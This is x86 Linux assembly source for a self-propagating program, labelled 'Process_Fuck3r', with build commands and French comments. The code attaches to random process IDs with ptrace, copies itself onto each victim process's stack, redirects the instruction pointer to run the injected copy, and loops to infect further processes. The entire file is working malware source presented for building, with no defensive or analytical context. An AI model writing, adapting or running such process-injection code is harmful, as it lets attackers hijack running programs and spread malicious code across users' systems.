;                                  Process_Fuck3r
;                                  --------------
;
;
;nasm -f elf pf.asm
;cc pf.o -o pf -nostdlib
;
;

STRUC regs_struc
	.ebx:		resd		1
	.ecx:		resd		1
	.edx:		resd		1
	.esi:		resd		1
	.edi:		resd		1
	.ebp:		resd		1
	.eax:		resd		1
	.ds:		resw		1
	.__ds:		resw		1
	.es:		resw		1
	.__es:		resw		1
	.fs:		resw		1
	.__fs:		resw		1
	.gs:		resw		1
	.__gs:		resw		1
	.orig_eax:	resd		1
	.eip:		resd		1
	.cs:		resw		1
	.__cs:		resw		1
	.eflags		resd		1
	.esp:		resd		1
	.ss:		resw		1
	.__ss:		resw		1
ENDSTRUC

%define size_regs_struc (regs_struc.__ss)-(regs_struc.ebx) +2


%define		sys_fork		2

%define		sys_time		13

%define		sys_ptrace		26
%define		PTRACE_POKEDATA		 5
%define		PTRACE_GETREGS		12
%define		PTRACE_SETREGS		13
%define		PTRACE_ATTACH		16
%define		PTRACE_DETACH		17

%define		sys_times		43



global _start
section .evil

_start:

	times	4	nop

call	delta
delta:
	pop 	ebp
	sub	ebp, 9



;-----------------------------------------------------------------------------
;
;générateur de nombres pseudo aléatoire

_rnd_pid:

	xor	eax, eax
	mov	 al, sys_time
	xor 	ebx, ebx
	int 	0x80

	push	0x0000FFFF

	shl	eax, cl
        add     eax, ecx                ; Adjust random value with random seed
        rol     ecx, 1                  ; Adjust random seed.
        add     ecx, 0x666
        push    32
        pop     ecx

CRC_Bit:
        shr     eax, 1                  ; Bit is set?
        jnc     Loop_CRC_Bit
        xor     eax, 0xedb88320

Loop_CRC_Bit:
        loop    CRC_Bit                 ; Do all 32 bits.
        pop     ecx                     ; ECX = Max_Val.

        xor     edx, edx                ; Divide truely random value
        div     ecx                     ; by Max_Val.
        xchg    edx, ecx



;-----------------------------------------------------------------------------
;
;ptrace attach

	xor 	eax, eax
	mov	 al, sys_ptrace
	xor	ebx, ebx
	mov	 bl, PTRACE_ATTACH  ;
	xor 	edx, edx
	xor 	esi, esi
	int 	0x80

	test	eax, eax
	jne	_rnd_pid            ;si eax négatif on essay un aure process



;-----------------------------------------------------------------------------
;
;recup des registres
	xor 	eax, eax
	mov	 al, sys_ptrace
	xor	ebx, ebx
	mov 	ebx, PTRACE_GETREGS
	xor	edx, edx
	sub	esp, size_regs_struc
	mov	esi, esp
	int	0x80

	test	eax, eax
	jne	_detach


;-----------------------------------------------------------------------------
;
;test infection
debug:
	mov	eax, [esp+regs_struc.eip]
	shr	eax, 28
	cmp	eax, 0xb             ;si quartet fort de eip == 0xb on quitte
	je	_detach



;recup de la place sur la stack du process hote
_stack:
	mov	eax,[esp+regs_struc.esp]
	sub	eax, 4096
	mov	[esp+regs_struc.esp], eax


;prépare la copi
	mov	eax, _end-_start     ;taille a copier
	xor	edi, edi             ;initialisation compteur

_copie:
        mov     ebx, PTRACE_POKEDATA
        lea     edx, [esp+regs_struc.esp+edi]
        mov     esi, dword [ebp+edi]
	push	eax				;sauvegarde de la size a copier
	xor	eax, eax
	mov	 al, sys_ptrace
	int 	0x80
	test	eax, eax
	jne	_detach
	pop	eax
	add	edi, 4
	cmp	edi, eax
	jbe	_copie



;redirection eip
_redirection:
	lea	eax, [esp+regs_struc.esp]
	add	eax, 2
	mov	[esp+regs_struc.eip], eax
	xor	eax, eax
	mov	 al, sys_ptrace
	mov	ebx, PTRACE_SETREGS
	xor 	edx, edx
	mov	esi, esp
	int	0x80

_detach:
	add	esp, size_regs_struc	;restauration de la stack

	xor 	eax, eax
	mov	 al, sys_ptrace
	xor	ebx, ebx
	mov	ebx, PTRACE_DETACH
	xor	edx, edx
	xor	esi, esi
	int 	0x80

	jmp 	_rnd_pid

times	3	nop
_end:






